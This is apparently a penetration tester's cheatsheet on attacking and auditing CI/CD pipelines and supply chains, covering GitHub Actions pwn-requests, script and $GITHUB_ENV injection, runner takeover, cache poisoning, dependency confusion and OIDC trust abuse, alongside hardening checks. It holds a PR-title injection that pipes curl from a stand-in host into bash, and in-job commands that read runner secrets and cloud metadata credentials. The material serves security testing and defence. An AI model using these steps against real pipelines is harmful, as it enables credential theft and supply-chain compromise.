---
tags:
  - hack-notes
  - cicd
---

# CICD and Supply Chain Cheatsheet

Operator reference for attacking and auditing CI/CD pipelines and the software supply chain: secret scanning, GitHub Actions and GitLab CI abuse, dependency confusion, SBOM/SCA, and OIDC-to-cloud trust abuse. This domain is the focus of the user's own tool Caminus (multi-platform CI/CD pipeline attack framework), which automates much of the recon-to-runner/cloud path described here.

## Table of Contents

- [Secret Scanning](#secret-scanning)
- [GitHub Actions Abuse](#github-actions-abuse)
- [GITHUB_TOKEN and Env Injection](#github_token-and-env-injection)
- [Self-Hosted Runner Takeover](#self-hosted-runner-takeover)
- [Artifact and Cache Poisoning](#artifact-and-cache-poisoning)
- [Unpinned Action Tags](#unpinned-action-tags)
- [GitLab CI Risks](#gitlab-ci-risks)
- [Dependency Confusion and Typosquatting](#dependency-confusion-and-typosquatting)
- [SBOM and SCA](#sbom-and-sca)
- [CI Analysis Tools](#ci-analysis-tools)
- [OIDC to Cloud Trust Abuse](#oidc-to-cloud-trust-abuse)
- [Common Workflows](#common-workflows)
- [Quick Reference](#quick-reference)

---

## Secret Scanning

Scan working trees, full git history, and remote orgs for leaked credentials. History matters: a secret removed in HEAD often lives in an old commit.

```bash
# trufflehog: verified secrets across a git repo (scans full history)
trufflehog git https://github.com/org/repo --only-verified

# trufflehog: a local checkout including all branches and history
trufflehog git file://. --only-verified --json

# trufflehog: a filesystem path (build dirs, configs, dotfiles)
trufflehog filesystem /path/to/checkout --only-verified

# trufflehog: an entire GitHub org (needs a token for private/rate limits)
trufflehog github --org=target-org --only-verified

# trufflehog: a single GitHub repo via the github source
trufflehog github --repo=https://github.com/org/repo
```

```bash
# gitleaks: detect secrets in git history
gitleaks detect --source . --report-format json --report-path leaks.json

# gitleaks: scan only the working tree, not history (faster, pre-commit style)
gitleaks detect --source . --no-git

# gitleaks: scan a specific commit range
gitleaks detect --source . --log-opts="--since=2024-01-01"

# gitleaks: protect mode (uncommitted changes, for a pre-commit hook)
gitleaks protect --staged --source .
```

Always confirm a hit is live before reporting: many matches are rotated, example, or test values. trufflehog's `--only-verified` actively checks the credential against the provider.

---

## GitHub Actions Abuse

The highest-impact CI bugs come from running attacker-controlled input in a privileged context.

### pull_request_target pwn-request

`pull_request_target` runs in the context of the base repo (with secrets and a write-capable token) but is triggered by forks. If the workflow checks out and executes the PR head, a fork can run code with the base repo's secrets.

```yaml
# VULNERABLE pattern: pull_request_target + checkout of untrusted PR head
on: pull_request_target            # runs with base-repo secrets/token
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # attacker code
      - run: npm install && npm test   # executes attacker-controlled scripts
```

```text
Why it is exploitable:
  - pull_request_target grants secrets.* and a token with repo write
  - checking out head.sha pulls the fork's code
  - any build/test/install step then runs that code with those privileges
Exfil target: dump ${{ secrets.* }}, the GITHUB_TOKEN, env, OIDC token.
```

### Expression / script injection

Untrusted `github.event.*` fields interpolated into a `run:` shell are injected before the shell ever sees them (template expansion happens first).

```yaml
# VULNERABLE: PR title flows straight into the shell
- run: echo "Building PR: ${{ github.event.pull_request.title }}"
#   PR title of:  a"; curl evil.sh | bash; #
#   becomes:      echo "Building PR: a"; curl evil.sh | bash; #"
```

Attacker-controllable fields to watch: `pull_request.title`, `pull_request.body`, `pull_request.head.ref` (branch name), `issue.title`, `issue.body`, `comment.body`, `review.body`, `head_commit.message`, author names.

```yaml
# SAFER: pass through an env var so the shell receives a literal value
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Building PR: $TITLE"
```

---

## GITHUB_TOKEN and Env Injection

### GITHUB_TOKEN permissions

```yaml
# Least privilege: default the whole workflow to read-only
permissions:
  contents: read

jobs:
  publish:
    permissions:
      contents: write          # widen only where needed
      id-token: write          # only if doing OIDC
```

```text
Audit questions:
  - Is permissions: set at all? (absent = broad default token scope)
  - Does any job grant contents: write / packages: write / id-token: write?
  - Can an injection step reach that token?  ${{ secrets.GITHUB_TOKEN }}
```

### $GITHUB_ENV and $GITHUB_PATH injection

Writing to the `$GITHUB_ENV` file sets environment variables for *later steps*; writing to `$GITHUB_PATH` prepends to PATH. If attacker-controlled text reaches these files, later steps are compromised.

```bash
# Legitimate use (intended):
echo "VERSION=1.2.3" >> "$GITHUB_ENV"
echo "/opt/tool/bin" >> "$GITHUB_PATH"

# ATTACK: untrusted content written to $GITHUB_ENV can set dangerous vars
#   e.g. inject LD_PRELOAD, NODE_OPTIONS, or overwrite a path used later.
#   A multiline injected value can also smuggle extra KEY=VALUE lines.
echo "$UNTRUSTED" >> "$GITHUB_ENV"     # if $UNTRUSTED = "NODE_OPTIONS=--require=/tmp/x"
```

```text
Dangerous targets to set via $GITHUB_ENV injection:
  NODE_OPTIONS, LD_PRELOAD, BASH_ENV, PYTHONPATH, RUBYOPT, PERL5OPT, GEM_PATH
A later step that runs node/python/bash then loads attacker code.
$GITHUB_PATH injection puts an attacker-controlled binary dir ahead of trusted ones.
```

---

## Self-Hosted Runner Takeover

Self-hosted runners are persistent machines. On public repos they are dangerous because a fork PR can schedule a job onto them.

```text
Risk model:
  - Non-ephemeral runner: workspace, caches, and creds persist between jobs.
    Job A (attacker PR) plants a payload; job B (privileged) picks it up.
  - Public repo + self-hosted + pull_request from fork = arbitrary code on
    your infrastructure with whatever that host can reach.
  - Runner registration tokens and the runner's cloud identity are prizes.
```

```bash
# Recon from inside a job you can run on the runner:
hostname; id; uname -a                 # who/where am I
env | sort                              # leaked secrets/config
cat /home/*/actions-runner/.runner 2>/dev/null   # runner registration data
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ # cloud creds
ls -la /home/*/actions-runner/_work    # leftover artifacts from prior jobs
```

```text
Hardening to check for:
  - Ephemeral runners (--ephemeral) that tear down after one job
  - Runner groups restricting which repos can target the runner
  - "Require approval for fork PRs" enabled in Actions settings
```

---

## Artifact and Cache Poisoning

```text
Artifact poisoning:
  A privileged workflow (e.g. on workflow_run / release) downloads an
  artifact uploaded by a less-trusted workflow (e.g. the PR build) and
  trusts its contents. The PR build writes a malicious artifact; the
  privileged job consumes it -> code exec with the privileged context.

Cache poisoning:
  actions/cache keys are shared across branches by default. A fork/PR job
  can write a cache entry that a later trusted job restores, planting
  malicious build deps, compilers, or node_modules.
```

```yaml
# Smell: privileged workflow consuming an artifact from another workflow
on:
  workflow_run:
    workflows: ["PR Build"]
    types: [completed]
jobs:
  deploy:
    permissions:
      contents: write
    steps:
      - uses: actions/download-artifact@v4   # artifact came from PR build
      - run: ./artifact/installer.sh         # trusts attacker output
```

Check that artifact/cache contents are validated (checksums, provenance) before a privileged job acts on them, and that cache keys are scoped so untrusted branches cannot poison trusted ones.

---

## Unpinned Action Tags

Referencing an action by a moving tag (`@v4`, `@main`) trusts whoever controls that tag. A compromised or repointed tag runs new code in your pipeline.

```yaml
# RISKY: mutable references
- uses: actions/checkout@v4          # tag can be repointed
- uses: some/action@main             # branch tip, changes at will

# SAFER: pin to a full commit SHA (immutable), comment the version
- uses: actions/checkout@8f4b7f84864484a7bf31766abe9204da3cbe65b3  # v4.1.1
```

```bash
# Audit a repo for unpinned actions
grep -rEn 'uses:\s+[^@]+@(v?[0-9]+|main|master|latest)\b' .github/workflows/
```

---

## GitLab CI Risks

```text
CI_JOB_TOKEN:
  Short-lived token scoped to the job. Historically broad: could read other
  projects' repos/registries via the API if allowlists were not configured.
  Check CI/CD > Token Access (job token allowlist) on each project.

Protected variables and environments:
  "Protected" secrets are exposed only on protected branches/tags. A bug
  that lets an unprivileged branch run a protected job (or a misconfigured
  "protected" flag) leaks production secrets.

Runner abuse:
  Shared runners run jobs from many projects. A malicious .gitlab-ci.yml can
  attempt to read leftover state, the runner's identity, or the docker socket
  if the executor mounts it.
```

```yaml
# Smell in .gitlab-ci.yml: using the job token against other projects,
# or echoing secrets where a downstream/MR pipeline could capture them.
deploy:
  script:
    - curl --header "JOB-TOKEN: $CI_JOB_TOKEN" "$CI_API_V4_URL/projects/123/..."
    - echo "$PROD_SECRET"        # leaks if job runs on an untrusted ref
```

```bash
# Recon from inside a GitLab job
env | grep -E 'CI_|TOKEN|SECRET'        # what is exposed to this job
cat /proc/1/environ | tr '\0' '\n'      # runner/container env
ls -la /var/run/docker.sock 2>/dev/null # docker-out-of-docker escape surface
```

---

## Dependency Confusion and Typosquatting

```text
Dependency confusion:
  An internal package name (e.g. @acme/internal-utils or acme-config) is not
  published to the public registry. If the build resolves the public registry
  first/also, an attacker who publishes that exact name publicly (with a higher
  version) can have it pulled into the build -> code exec on install.

Typosquatting:
  Publish a package whose name is a common misspelling of a popular one
  (reqeusts, loadsh, electorn) and wait for a typo'd install.
```

```bash
# Find internal/scoped names that might be confusable (npm)
jq -r '.dependencies, .devDependencies | keys[]' package.json | grep '^@'
cat .npmrc                              # which registry resolves which scope?

# Defenses to verify are in place:
#   .npmrc scope pinning: @acme:registry=https://nexus.internal/...
#   npm: package-lock.json with integrity hashes + --ignore-scripts in CI
#   pip: --index-url to the internal index ONLY (not --extra-index-url, which
#        merges public + private and is the classic confusion vector)
pip config list                         # check index-url vs extra-index-url
```

```bash
# Inspect a suspicious package before trusting it
npm view <pkg> versions dist.tarball maintainers
npm pack <pkg> && tar -tzf <pkg>-*.tgz  # list files without installing
# Disable install scripts when investigating:
npm install --ignore-scripts
```

---

## SBOM and SCA

Generate a Software Bill of Materials and scan it (and images/IaC) for known-vulnerable components.

```bash
# syft: generate an SBOM from an image, dir, or archive
syft <image>:tag -o spdx-json=sbom.spdx.json
syft dir:. -o cyclonedx-json=sbom.cdx.json

# grype: scan an image or an SBOM for known CVEs
grype <image>:tag
grype sbom:sbom.cdx.json --fail-on high

# trivy: all-in-one (image, fs, config/IaC, repo, secrets)
trivy image <image>:tag
trivy fs --scanners vuln,secret,misconfig .
trivy config .                          # Terraform/K8s/Dockerfile misconfig
trivy repo https://github.com/org/repo

# osv-scanner: lockfile/SBOM scanning against the OSV database
osv-scanner --lockfile package-lock.json
osv-scanner -r .                        # recursive over a project
osv-scanner --sbom sbom.spdx.json
```

---

## CI Analysis Tools

Purpose-built scanners for CI/CD pipeline misconfiguration and GitHub Actions abuse.

```bash
# poutine (BoostSecurity): scans CI/CD configs across GitHub/GitLab for
# supply-chain and pipeline weaknesses
poutine analyze_local .                                  # local repo
poutine analyze_repo org/repo --token "$GITHUB_TOKEN"    # a single repo
poutine analyze_org org --token "$GITHUB_TOKEN"          # an entire org

# gato (Praetorian): GitHub Actions enumeration and self-hosted runner abuse
gato enumerate -t org-name                # enumerate an org's workflows/runners
gato enumerate -r org/repo                # a single repo
gato search -q 'self-hosted'              # find candidate targets
gato attack ...                           # offensive ops (see --help)

# gato-x: the maintained successor with expanded enum + attack capabilities
gato-x enumerate -t org-name
gato-x enumerate -r org/repo
gato-x attack ...                         # confirm flags with gato-x --help
```

Set a GitHub PAT in `GITHUB_TOKEN` for these. gato/gato-x can move from enumeration into active runner attacks, so run attack modes only against authorized targets. The user's own Caminus covers the same recon-to-runner/cloud chain as a unified toolkit.

---

## OIDC to Cloud Trust Abuse

Modern pipelines exchange a short-lived OIDC token for cloud credentials instead of storing long-lived keys. The trust policy is the attack surface: an overly broad `sub` condition lets the wrong workflow assume the role.

```yaml
# GitHub Actions requesting an OIDC token to assume an AWS role
permissions:
  id-token: write              # required to mint the OIDC token
  contents: read
jobs:
  deploy:
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::111122223333:role/ci-deploy
          aws-region: us-east-1
```

```json
// Dangerous AWS trust policy: wildcard subject trusts the whole org
{
  "Condition": {
    "StringLike": {
      "token.actions.githubusercontent.com:sub": "repo:acme/*"
    }
  }
}
// Safer: pin repo + ref/environment
//   "sub": "repo:acme/payments:ref:refs/heads/main"
//   "sub": "repo:acme/payments:environment:production"
// And always pin the audience:
//   "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
```

```text
What to check on a cloud OIDC trust relationship:
  - Is the audience (aud) pinned to the expected value?
  - Is sub pinned to a specific repo AND ref/environment, not a wildcard?
  - Could a fork PR or a different repo in the org satisfy the condition?
  - Does the assumed role grant more than the deploy actually needs?

After a foothold in a job with id-token: write, inspect the granted identity:
  aws sts get-caller-identity
  gcloud auth list ; gcloud config list
  az account show
```

---

## Common Workflows

### 1. Recon the CI config

```bash
# Pull every pipeline definition and look for the danger triggers
ls -la .github/workflows/ .gitlab-ci.yml
grep -rn 'pull_request_target' .github/workflows/
grep -rEn '\$\{\{\s*github\.event\.' .github/workflows/   # injection sources
grep -rEn 'uses:.+@(v?[0-9]+|main|master)\b' .github/workflows/  # unpinned
grep -rn 'self-hosted' .github/workflows/

# Automated pass over the same surface
poutine analyze_local .
```

### 2. Find injection or a secret

```bash
# Map attacker-controllable input to a privileged sink
#   source: github.event.* / branch names / issue + comment bodies
#   sink:   run: shell, $GITHUB_ENV, $GITHUB_PATH, a privileged token
# Then hunt for leaked creds in history
trufflehog git file://. --only-verified
gitleaks detect --source .
```

### 3. Escalate to runner or cloud

```bash
# If you can land a job on a self-hosted runner, enumerate identity + reach
gato-x enumerate -r org/repo
# From inside the job: dump env, query instance metadata, check the OIDC role
env | sort
aws sts get-caller-identity 2>/dev/null
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

The user's Caminus chains these phases (scan, enum, graph, cloud, exploit) into one workflow; reach for it when running the full recon-to-cloud path on an authorized target.

---

## Quick Reference

```bash
# Secret scanning
trufflehog git file://. --only-verified
trufflehog github --org=target-org --only-verified
gitleaks detect --source . --report-path leaks.json

# GitHub Actions audit
grep -rn 'pull_request_target' .github/workflows/
grep -rEn '\$\{\{\s*github\.event\.' .github/workflows/
grep -rEn 'uses:.+@(v?[0-9]+|main|master)\b' .github/workflows/

# CI analysis tools
poutine analyze_repo org/repo --token "$GITHUB_TOKEN"
gato-x enumerate -r org/repo

# Dependency confusion checks
cat .npmrc ; pip config list

# SBOM + SCA
syft <image>:tag -o cyclonedx-json=sbom.cdx.json
grype <image>:tag --fail-on high
trivy fs --scanners vuln,secret,misconfig .
osv-scanner -r .

# OIDC identity check from inside a job
aws sts get-caller-identity
```

| Area | Tool / Check | Note |
| --- | --- | --- |
| Secrets | trufflehog, gitleaks | scan full history, verify hits |
| Actions injection | `github.event.*` into `run:` | template expansion precedes shell |
| Privileged trigger | `pull_request_target` + head checkout | pwn-request |
| Step taint | `$GITHUB_ENV`, `$GITHUB_PATH` | sets env/PATH for later steps |
| Token scope | `permissions:` block | default read-only |
| Pinning | `uses: ...@<sha>` | avoid moving tags |
| Runners | self-hosted on public repo | prefer ephemeral + approval |
| GitLab | `CI_JOB_TOKEN`, protected vars | allowlist, protected refs |
| Dep confusion | `.npmrc`, `--extra-index-url` | pin scopes, internal index only |
| SBOM/SCA | syft, grype, trivy, osv-scanner | generate then scan |
| CI analysis | poutine, gato, gato-x | enum and attack |
| OIDC | cloud trust policy `sub`/`aud` | pin repo + ref + audience |

Related: Caminus (the user's CI/CD pipeline attack framework covering this domain).

---

## Related

- Checklists: [CICD Pipeline](../Checklists/CICD%20Pipeline.md)
- Caminus
- [OSINT and Recon](OSINT%20and%20Recon.md)
- [AWS Pentest](AWS%20Pentest.md)
- [Kubernetes and Container Breakout](Kubernetes%20and%20Container%20Breakout.md)
- Vercelsior

---
*Part of the [Pentest Field Guide](https://github.com/Su1ph3r/hack-notes-field-guide), maintained by [Cairn Security](https://cairnsecurity.com). Independent penetration testing.*
